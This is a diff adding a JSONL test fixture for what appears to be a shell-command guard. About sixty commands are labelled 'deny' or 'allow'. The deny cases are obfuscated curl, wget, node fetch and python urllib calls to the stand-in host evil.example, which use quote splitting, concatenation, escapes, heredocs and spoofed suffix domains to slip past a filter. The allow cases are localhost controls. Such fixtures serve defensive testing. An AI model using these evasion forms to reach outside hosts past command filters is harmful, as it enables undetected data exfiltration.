@@ -1,0 +1,59 @@
+{"id":"CC-A01","class":"C","family":"CURL","cmd":"curl \"https://ev\"'il.example'/x","expect":"deny"}
+{"id":"CC-A02","class":"C","family":"CURL","cmd":"curl https://\"evil\".example","expect":"deny"}
+{"id":"CC-A03","class":"C","family":"CURL","cmd":"curl h\"ttps://\"evil.example","expect":"deny"}
+{"id":"CC-A04","class":"C","family":"CURL","cmd":"curl $'https://evil.example/x'","expect":"deny"}
+{"id":"CC-A05","class":"C","family":"CURL","cmd":"curl ht\\tps://ev\\il.example","expect":"deny"}
+{"id":"CC-A06","class":"C","family":"CURL","cmd":"curl \"https://api.github.com\"\".evil.example/x\"","expect":"deny"}
+{"id":"CC-A07","class":"C","family":"CURL","cmd":"wget \"https://\"'evil.example'/f","expect":"deny"}
+{"id":"CC-A08","class":"C","family":"CURL","cmd":"curl \"${S}://evil.example\"","expect":"deny"}
+{"id":"CC-A09","class":"C","family":"CURL","cmd":"curl \"https://${H:-evil.example}/x\"","expect":"deny"}
+{"id":"CC-A10","class":"C","family":"CURL","cmd":"curl https://api.github.com\"${X}\"/x","expect":"deny"}
+{"id":"CC-A11","class":"C","family":"CURL","cmd":"curl -s -X POST \"http://localhost\"'.evil.example/api'","expect":"deny"}
+{"id":"CC-A13","class":"C","family":"CURL","cmd":"curl ev\"il.example\"/x","expect":"deny"}
+{"id":"CC-A12","class":"C","family":"CURL","cmd":"for u in \"https://ev\"'il.example'; do curl -s \"$u\"; done","expect":"deny"}
+{"id":"CC-B01","class":"C","family":"CODE","cmd":"node -e \"fetch('https://ev\"'il.example'\"/x')\"","expect":"deny"}
+{"id":"CC-B02","class":"C","family":"CODE","cmd":"node -e \"fetch('https://api.github.com\"'.evil.example'\"/x')\"","expect":"deny"}
+{"id":"CC-B03","class":"C","family":"CODE","cmd":"node -e \"fetch('https://\"'evil.example'\"/')\"","expect":"deny"}
+{"id":"CC-B04","class":"C","family":"CODE","cmd":"node -e \"fetch('h\"ttps://evil.example\"')\"","expect":"deny"}
+{"id":"CC-B05","class":"C","family":"CODE","cmd":"node -e \"fetch('http://localhost\"'.evil.example'\"/x')\"","expect":"deny"}
+{"id":"CC-B06","class":"C","family":"CODE","cmd":"python3 -c \"import urllib.request as u; u.urlopen('https://\"evil.example\"/x')\"","expect":"deny"}
+{"id":"CC-B07","class":"C","family":"CODE","cmd":"python3 -c import\\ urllib.request\\ as\\ u\\;u.urlopen\\(\\'https://api.github.com\\.evil.example\\'\\)","expect":"deny"}
+{"id":"CC-C01","class":"C","family":"CODE","cmd":"python3 -c \"import urllib.request as u; u.urlopen('https://api.github.com' '.evil.example')\"","expect":"deny"}
+{"id":"CC-C02","class":"C","family":"CODE","cmd":"python3 -c \"import urllib.request as u; u.urlopen('https://api.github.com'+'.evil.example')\"","expect":"deny"}
+{"id":"CC-C03","class":"C","family":"CODE","cmd":"python3 -c \"import urllib.request as u; u.urlopen('ht'+'tps://evil.example')\"","expect":"deny"}
+{"id":"CC-C04","class":"C","family":"CODE","cmd":"python3 -c \"import urllib.request as u; u.urlopen('https:/'+'/evil.example')\"","expect":"deny"}
+{"id":"CC-C05","class":"C","family":"CODE","cmd":"python3 -c 'import urllib.request as u; u.urlopen(\"https://\\x65vil.example\")'","expect":"deny"}
+{"id":"CC-C06","class":"C","family":"CODE","cmd":"node -e \"fetch('http://localhost' + '.evil.example/x')\"","expect":"deny"}
+{"id":"CC-C07","class":"C","family":"CODE","cmd":"node -e \"fetch(\\`https://\\${'evil'}.example\\`)\"","expect":"deny"}
+{"id":"CC-C08","class":"C","family":"CODE","cmd":"python3 <<'EOF'\nimport urllib.request as u\nu.urlopen('https://api.github.com' '.evil.example')\nEOF","expect":"deny"}
+{"id":"CC-D01","class":"C","family":"CODE","cmd":"python3 <<< \"import urllib.request as u; u.urlopen('https://api.github.com\"'.evil.example'\"/x')\"","expect":"deny"}
+{"id":"CC-D02","class":"C","family":"CODE","cmd":"node -e \"fetch('https://api.github.com%2eevil.example/x')\"","expect":"deny"}
+{"id":"CC-D03","class":"C","family":"CODE","cmd":"node -e \"fetch('https://api.github.com\"'@evil.example'\"/x')\"","expect":"deny"}
+{"id":"CC-K01","class":"L","family":"CONTROL","cmd":"curl -s -H \"Authorization: Bearer $(cat /Users/gyorgydecsi/marveen/store/.dashboard-token)\" http://localhost:3420/api/kanban","expect":"allow"}
+{"id":"CC-K02","class":"L","family":"CONTROL","cmd":"echo \"see https://github.com/o/r/pull/1\" > /tmp/note.txt","expect":"allow"}
+{"id":"CC-K03","class":"L","family":"CONTROL","cmd":"curl -s -X POST http://localhost:3420/api/messages -H \"Content-Type: application/json\" -d '{\"content\":\"PR: https://github.com/o/r/pull/1\"}'","expect":"allow"}
+{"id":"CC-K04","class":"L","family":"CONTROL","cmd":"python3 -c \"print('https://example.com')\"","expect":"allow"}
+{"id":"CC-K05","class":"L","family":"CONTROL","cmd":"node -e \"fetch('http://localhost:3420/api/health')\"","expect":"allow"}
+{"id":"CC-K06","class":"L","family":"CONTROL","cmd":"node -e \"fetch('http://localhost:3420' + '/api/health')\"","expect":"allow"}
+{"id":"CC-K07","class":"L","family":"CONTROL","cmd":"python3 -c \"import urllib.request as u; u.urlopen('http://127.0.0.1:3420/'+'api/health')\"","expect":"allow"}
+{"id":"CC-K08","class":"L","family":"CONTROL","cmd":"curl -s \"http://localhost:3420\"'/api/kanban'","expect":"allow"}
+{"id":"CC-K10","class":"L","family":"CONTROL","cmd":"python3 -c \"import urllib.request as u; u.urlopen('file:///tmp/x.json')\"","expect":"allow"}
+{"id":"CC-K11","class":"L","family":"CONTROL","cmd":"python3 -c \"import urllib.request as u; p=3420; u.urlopen(f'http://localhost:{p}/api/health')\"","expect":"allow"}
+{"id":"CC-X01","class":"C","family":"CODE","cmd":"python3 -c \"import urllib.request as u; u.urlopen(('https://api.github.com')+'.evil.example')\"","expect":"deny"}
+{"id":"CC-X02","class":"C","family":"CODE","cmd":"python3 <<'EOF'\nimport urllib.request as u\nu.urlopen(('https://api.github.com'\n  '.evil.example'))\nEOF","expect":"deny"}
+{"id":"CC-X03","class":"C","family":"CODE","cmd":"node <<'EOF'\nfetch('http://localhost'\n  + '.evil.example')\nEOF","expect":"deny"}
+{"id":"CC-X04","class":"C","family":"CODE","cmd":"python3 -c \"import urllib.request as u; u.urlopen('h'+'ttps:'+'//evil.example')\"","expect":"deny"}
+{"id":"CC-X05","class":"C","family":"CODE","cmd":"python3 -c \"import urllib.request as u; u.urlopen('https://api.github.com'\\\"@evil.example/x\\\")\"","expect":"deny"}
+{"id":"CC-X06","class":"C","family":"CODE","cmd":"python3 -c \"import urllib.request as u; h='evil.example'; u.urlopen('https://'+h)\"","expect":"deny"}
+{"id":"CC-X07","class":"C","family":"CODE","cmd":"python3 -c \"import urllib.request as u, socket; socket.create_connection(('x', 1)); u.urlopen('redis://evil.example:6379')\"","expect":"deny"}
+{"id":"CC-X08","class":"C","family":"CODE","cmd":"node <<'EOF'\nfetch('http://127.0.0.1' + '.evil.example/x')\nEOF","expect":"deny"}
+{"id":"CC-L01","class":"L","family":"CODE","cmd":"node -e \"const p='/api/x'; fetch('http://localhost:3420'+p)\"","expect":"allow"}
+{"id":"CC-L02","class":"L","family":"CODE","cmd":"python3 -c \"import urllib.request as u; h={'A': 'b'}; u.urlopen(u.Request('http://127.0.0.1:3420/api', headers=h))\"","expect":"allow"}
+{"id":"CC-L03","class":"L","family":"CODE","cmd":"python3 -c \"import urllib.request as u; p=3420; u.urlopen(f'http://localhost:{p}')\"","expect":"allow"}
+{"id":"CC-L04","class":"L","family":"CODE","cmd":"node -e \"fetch('http://nas.local:5000/x')\"","expect":"allow"}
+{"id":"CC-L05","class":"L","family":"CODE","cmd":"python3 -c \"import urllib.request as u; u.urlopen('http://localhost').read()\"","expect":"allow"}
+{"id":"CC-L07","class":"L","family":"CODE","cmd":"python3 <<'EOF'\nimport urllib.request as u\nbase = 'http://localhost'\nprint(u.urlopen(base).status)\nEOF","expect":"allow"}
+{"id":"CC-L08","class":"L","family":"CODE","cmd":"python3 -c \"import urllib.request as u; u.urlopen('http://[::1]:3420/api/health')\"","expect":"allow"}
+{"id":"CC-L09","class":"L","family":"CODE","cmd":"node -e \"fetch('http://localhost:3420/api/' + 'kanban')\"","expect":"allow"}
+{"id":"CC-L10","class":"L","family":"CODE","cmd":"python3 -c \"import requests; requests.get('http://127.0.0.1:3420/x', headers={'Authorization': 'Bearer t'}, timeout=5)\"","expect":"allow"}
+{"id":"CC-L11","class":"L","family":"CODE","cmd":"node -e \"fetch(`http://localhost:${3420}/api/health`)\"","expect":"allow"}
